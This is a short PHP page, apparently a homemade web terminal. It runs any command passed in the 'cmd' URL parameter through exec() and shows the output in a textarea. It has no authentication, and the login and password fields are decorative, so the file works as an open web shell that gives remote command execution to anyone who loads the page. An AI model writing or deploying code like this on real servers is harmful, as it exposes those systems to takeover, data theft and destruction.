<?php 
require_once("Console.php");
?>
<!DOCTYPE html>
<!--
To change this license header, choose License Headers in Project Properties.
To change this template file, choose Tools | Templates
and open the template in the editor.
-->
<html>
    <head>
        <meta charset="UTF-8">
        <title></title>
    <style type="text/css">
textarea {
    width: 100%;
 background-color: black;
 color: white;
 font-size: 1em;
 font-family: Courier, sans-serif;
 border: 1px solid black;
}
.inputline {
    width: 100%;
 background-color: black;
 color: white;
 font-size: 1em;
 font-family: Verdana, Arial, Helvetica, sans-serif;
 border: 1px solid black;
}
</style>
    </head>
    <body color="white">
        <form name="subm" action="index.php" method="GET">
        Host  <input type="text"/><br/>
        Login <input type="text"/><br/>
        Pwd   <input type="text"/><br/>
        Cwd   <input type="text"/><br/>

        <textarea id="textarea" rows="20" readonly><?php
        $cmd = filter_input(INPUT_GET, 'cmd', FILTER_SANITIZE_ENCODED);
        if (isset($cmd) && $cmd != "")
        {
            $cmd = urldecode($cmd);
            Console::registerOutput("\n>$cmd\n");
            exec($cmd, $output, $exitcode);
            if ($exitcode !== 0)
            {
                Console::registerOutput("\nERRNR:".$exitcode . "\n");
            }
            Console::registerOutput(implode("\n",$output));
        }
        echo Console::getOutput();
        ?>
        </textarea><br/>
        <input class="inputline" id="cmd" name="cmd" type="text"/>
        </form>
        <script >var textarea = document.getElementById('textarea');
                textarea.scrollTop = textarea.scrollHeight;</script>
    </body>
</html>
